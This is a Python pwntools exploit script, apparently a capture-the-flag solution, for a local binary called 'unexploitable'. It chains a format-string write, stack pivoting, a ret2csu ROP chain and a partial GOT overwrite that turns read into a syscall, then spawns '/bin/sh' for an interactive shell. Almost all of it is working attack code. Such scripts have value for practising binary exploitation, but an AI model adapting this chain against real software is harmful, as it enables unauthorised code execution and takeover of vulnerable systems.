#coding=utf-8
from pwn import*
import time
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./unexploitable')
elf = ELF('./unexploitable')

def pr(a,addr):
	log.success(a+': '+hex(addr))

csu_init_gadget1 = 0x400670
'''
mov     rdx, r15
mov     rsi, r14
mov     edi, r13d
call    qword ptr [r12+rbx*8]
'''
csu_init_gadget2 = 0x40068a
'''
pop     rbx
pop     rbp
pop     r12
pop     r13
pop     r14
pop     r15
retn
'''
def csu_rop(rbx, rbp, call, rdi, rsi, rdx, ret):
	rop  = p64(rbx)
	rop += p64(rbp)
	rop += p64(call)
	rop += p64(rdi)
	rop += p64(rsi)
	rop += p64(rdx)
	rop += p64(ret)
	return rop

read_got = elf.got["read"] #0x601028
extern_read = 0x601060
prbp_ret = 0x400528
leave_ret = 0x400622

p.recvuntil("Here's your gift: ")
data_addr = int(p.recv(14),16)

rbp_addr = data_addr + 0x810
ROP_chain = data_addr + 0x120

pr("rbp_addr",rbp_addr)
pr('ROP_chain', ROP_chain)

payload = fmtstr_payload(offset=6,
	writes={rbp_addr:ROP_chain-8, rbp_addr+8:leave_ret},
	write_size_max="byte",write_size="byte")
payload = payload.ljust(0x120,'\x00')

payload += p64(csu_init_gadget2)
payload += csu_rop(0,1,read_got,0,extern_read,0x200,csu_init_gadget1)
payload += "\x00"*0x38 #pad
payload += p64(prbp_ret) #set rbp
payload += p64(extern_read-0x8)
payload += p64(leave_ret) #migrate 栈迁移

#gdb.attach(p)
#pause()
time.sleep(1)
p.send(payload)

payload2  = p64(csu_init_gadget2)
payload2 += csu_rop(0,1,read_got,0,read_got,0x1,csu_init_gadget1)

payload2 += p64(0) #padding<-rsp,之后执行 csu_init_gadget2，系统调用 write
payload2 += csu_rop(0,1,read_got,1,0x601310,0x0,csu_init_gadget1)

payload2 += p64(0) #padding<-rsp
payload2 += csu_rop(0,1,read_got,0,0x601310,0x100,csu_init_gadget1)

payload2 += p64(0) #padding<-rsp
payload2 += csu_rop(0,1,read_got,0x601160,0x0,0,csu_init_gadget1) #0x601160◂—'/bin/sh'
payload2 += '/bin/sh\x00'

#pause()
time.sleep(1)
p.send(payload2)

#pause()
time.sleep(1)
p.send('\x2f') #read 低字节修改为 syscal 的低字节 0x90|0x2f

#pause()
time.sleep(1)
p.send('A'*59)

p.interactive()